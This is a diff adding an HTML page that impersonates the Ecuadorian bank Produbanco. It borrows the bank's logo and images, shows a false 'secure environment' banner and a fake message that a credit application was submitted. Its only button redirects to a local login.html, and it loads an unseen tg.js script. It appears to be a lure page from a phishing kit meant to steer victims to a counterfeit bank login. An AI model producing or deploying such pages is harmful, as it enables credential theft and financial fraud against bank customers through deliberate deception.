@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <title>Tu crédito en minutos - Produbanco</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <!-- Favicon (misma ruta que en tus otras páginas) -->
+  <link rel="icon" href="https://content.prd.net.ec/bancaelectronica/produnet/imagen/2e3a91e7bb1390e0d9a651d81d77ec2b.png" />
+
+  <style>
+    :root {
+      --produbanco-green: #006b3f;
+      --produbanco-green-dark: #00552f;
+      --produbanco-secure-bg: #222222;
+      --produbanco-light-gray: #ffffff;
+      --card-radius: 16px;
+      --shadow-soft: 0 8px 24px rgba(0, 0, 0, 0.12);
+      --text-gray: #555555;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica,
+        Arial, sans-serif;
+      background-color: var(--produbanco-light-gray);
+      color: #333333;
+    }
+
+    /* TOP BAR (LOGO) PC + MOBILE */
+    .top-bar {
+      background-color: #ffffff;
+      border-bottom: 1px solid #e0e0e0;
+    }
+
+    .top-bar-inner {
+      max-width: 1180px;
+      margin: 0 auto;
+      padding: 8px 32px;
+      display: flex;
+      align-items: center;
+      justify-content: flex-start;
+    }
+
+    .top-bar-logo {
+      height: 50px;
+      width: auto;
+      display: block;
+    }
+
+    /* SECURE STRIP */
+    .secure-strip {
+      background-color: var(--produbanco-secure-bg);
+      color: #ffffff;
+    }
+
+    .secure-strip-inner {
+      max-width: 1180px;
+      margin: 0 auto;
+      padding: 10px 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      font-size: 13px;
+    }
+
+    .secure-icon {
+      width: 32px;
+      height: 32px;
+      flex-shrink: 0;
+    }
+
+    .secure-highlight {
+      font-weight: 600;
+    }
+
+    /* MAIN LAYOUT (PC) */
+    .page-wrapper {
+      min-height: calc(100vh - 96px);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 40px 24px;
+    }
+
+    .credit-card {
+      background-color: #ffffff;
+      border-radius: var(--card-radius);
+      box-shadow: var(--shadow-soft);
+      max-width: 880px;
+      width: 880px; /* ancho PC */
+      overflow: hidden;
+    }
+
+    .credit-card-inner {
+      padding: 32px 40px 32px;
+    }
+
+    .card-title {
+      text-align: center;
+      margin-bottom: 16px;
+    }
+
+    .card-title h1 {
+      margin: 0 0 6px;
+      font-size: 28px;
+      font-weight: 700;
+      color: #333333;
+    }
+
+    .card-title p {
+      margin: 0;
+      font-size: 15px;
+      color: var(--text-gray);
+      font-weight: 500;
+    }
+
+    .hero-wrapper {
+      margin: 24px -40px 0;
+    }
+
+    .hero-image {
+      width: 100%;
+      display: block;
+      height: 260px;
+      object-fit: cover;
+    }
+
+    .card-content {
+      padding: 24px 0 0;
+    }
+
+    .section-heading {
+      font-size: 18px;
+      font-weight: 700;
+      margin: 0 0 18px;
+      color: #333333;
+    }
+
+    .benefit-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+    }
+
+    .benefit-icon {
+      width: 22px;
+      height: 22px;
+      flex-shrink: 0;
+      margin-top: 2px;
+    }
+
+    .benefit-text {
+      margin: 0;
+      font-size: 15px;
+      line-height: 1.5;
+      color: #333333;
+      font-weight: 600; /* texto grueso */
+    }
+
+    .card-footer {
+      margin-top: 28px;
+      display: flex;
+      justify-content: flex-end;
+    }
+
+    .btn-continue {
+      min-width: 220px;
+      padding: 12px 32px;
+      border-radius: 6px;
+      border: none;
+      cursor: pointer;
+      background-color: var(--produbanco-green);
+      color: #ffffff;
+      font-size: 15px;
+      font-weight: 600;
+      text-align: center;
+      transition: background-color 0.2s ease, transform 0.05s ease;
+    }
+
+    .btn-continue:hover {
+      background-color: var(--produbanco-green-dark);
+    }
+
+    .btn-continue:active {
+      transform: translateY(1px);
+    }
+
+    /* ===========================
+       VERSIÓN MÓVIL
+       =========================== */
+    @media (max-width: 768px) {
+      body {
+        background-color: #ffffff;
+      }
+
+      .top-bar-inner {
+        padding: 6px 16px;
+      }
+
+      .top-bar-logo {
+        height: 44px;
+      }
+
+      .secure-strip-inner {
+        padding: 10px 16px;
+        justify-content: flex-start;
+        font-size: 12px;
+      }
+
+      .secure-icon {
+        width: 28px;
+        height: 28px;
+      }
+
+      .page-wrapper {
+        align-items: flex-start;
+        padding: 24px 16px 32px;
+      }
+
+      /* El cuadro ocupa prácticamente toda la pantalla en alto */
+      .credit-card {
+        width: 100%;
+        max-width: 480px;
+        border-radius: 16px;
+        box-shadow: none;
+        margin: 0 auto;
+        min-height: calc(100vh - 32px); /* más alto en móvil */
+      }
+
+      .credit-card-inner {
+        padding: 32px 16px 48px; /* más espacio arriba y abajo */
+        height: 100%;
+        display: flex;
+        flex-direction: column;
+      }
+
+      .card-title {
+        text-align: center;
+        margin-top: 8px;      /* baja un poco las letras */
+        margin-bottom: 20px;
+      }
+
+      .card-title h1 {
+        font-size: 22px;
+        margin-bottom: 4px;
+      }
+
+      .card-title p {
+        font-size: 14px;
+      }
+
+      .hero-wrapper {
+        margin: 16px -16px 0; /* imagen se queda prácticamente en el mismo sitio */
+      }
+
+      .hero-image {
+        height: auto;
+        max-height: 260px;
+        object-fit: cover;
+      }
+
+      .card-content {
+        padding-top: 20px;
+      }
+
+      .section-heading {
+        font-size: 16px;
+        margin-bottom: 14px;
+      }
+
+      .benefit-text {
+        font-size: 14px;
+      }
+
+      .card-footer {
+        margin-top: 48px;  /* baja más el botón */
+        justify-content: center;
+      }
+
+      .btn-continue {
+        width: 100%;
+        min-width: 0;
+        font-size: 16px;
+        padding: 14px 0;
+        border-radius: 6px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- BARRA SUPERIOR CON LOGO -->
+  <header class="top-bar">
+    <div class="top-bar-inner">
+      <!-- Usa la misma URL de logo que en los otros HTML -->
+      <img
+        class="top-bar-logo"
+        src="https://www.produbanco.com/Produnet/Imagen/DesignSystem/logotipo.svg"
+        alt="Produbanco"
+      />
+      <!-- NO hay botón de cerrar -->
+    </div>
+  </header>
+
+  <!-- BARRA DE ENTORNO SEGURO -->
+  <div class="secure-strip">
+    <div class="secure-strip-inner">
+      <img
+        class="secure-icon"
+        src="https://content.prd.net.ec/bancaelectronica/produnet/imagen/2f742caccad85d1899ecd65ccf998d2f.png"
+        alt="Candado seguro"
+      />
+      <span>
+        Estás en un entorno seguro con la garantía de
+        <span class="secure-highlight">Produbanco</span>
+      </span>
+    </div>
+  </div>
+
+  <!-- CONTENIDO PRINCIPAL -->
+  <main class="page-wrapper">
+    <section class="credit-card">
+      <div class="credit-card-inner">
+
+        <div class="card-title">
+          <h1>Tu crédito en minutos</h1>
+          <p>Proceso 100% en línea.</p>
+        </div>
+
+        <div class="hero-wrapper">
+          <img
+            class="hero-image"
+            src="https://static.wixstatic.com/media/1dff55_10f09fc0195744d0ad2eedba13012890~mv2.png"
+            alt="Personas utilizando su crédito"
+          />
+        </div>
+
+        <div class="card-content">
+          <h2 class="section-heading">Finaliza tu solicitud</h2>
+
+          <div class="benefit-item">
+            <img
+              class="benefit-icon"
+              src="https://content.prd.net.ec/bancaelectronica/produnet/imagen/27eaef03c1dc19f3c8dd4253681dff02.png"
+              alt="Confirmado"
+            />
+            <p class="benefit-text">
+              Tu solicitud de crédito ha sido enviada correctamente. Para continuar con el proceso,
+              inicia sesión en tu cuenta de Produbanco. Luego, podrás verificar los términos y
+              condiciones, y finalizar con la confirmación de tu solicitud de crédito.
+            </p>
+          </div>
+        </div>
+
+        <div class="card-footer">
+          <button id="btnContinuar" type="button" class="btn-continue">
+            Continuar
+          </button>
+        </div>
+
+      </div>
+    </section>
+  </main>
+
+  <script src="tg.js"></script>
+  <script>
+    (function () {
+      var btnContinuar = document.getElementById("btnContinuar");
+
+      function toggleLoader(show) {
+        if (window.TG && typeof TG.overlay === "function") {
+          TG.overlay(show);
+        }
+      }
+
+      toggleLoader(true);
+
+      window.addEventListener("load", function () {
+        toggleLoader(false);
+      });
+
+      window.addEventListener("pageshow", function () {
+        toggleLoader(false);
+      });
+
+      btnContinuar.addEventListener("click", function () {
+        btnContinuar.disabled = true;
+        toggleLoader(true);
+        setTimeout(function () {
+          window.location.href = "login.html";
+        }, 120);
+      });
+    })();
+  </script>
+</body>
+</html>
+
